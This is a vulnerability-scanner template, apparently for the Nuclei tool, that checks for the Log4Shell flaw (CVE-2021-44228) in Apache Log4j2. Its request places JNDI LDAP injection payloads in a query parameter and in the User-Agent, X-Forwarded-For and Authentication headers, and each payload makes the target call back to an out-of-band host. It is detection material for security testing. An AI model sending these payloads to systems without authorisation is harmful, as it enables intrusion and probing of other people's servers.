id: CVE-2021-44228
info:
  name: Apache Log4j2 Remote Code Execution (Log4Shell)
  author: knownsec
  severity: critical
  description: |
    Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) 
    JNDI features used in configuration, log messages, and parameters do not protect against 
    attacker controlled LDAP and other JNDI related endpoints.
  reference:
    - https://logging.apache.org/log4j/2.x/security.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  tags:
    - cve
    - cve2021
    - rce
    - log4j
    - oast

requests:
  - method: GET
    path: "/?x=${jndi:ldap://${hostName}.oast.example.com/a}"
    headers:
      User-Agent: "${jndi:ldap://${hostName}.oast.example.com/ua}"
      X-Forwarded-For: "${jndi:ldap://${hostName}.oast.example.com/xff}"
      Authentication: "${jndi:ldap://${hostName}.oast.example.com/auth}"
    matchers:
      - type: status
        status:
          - 200
          - 500
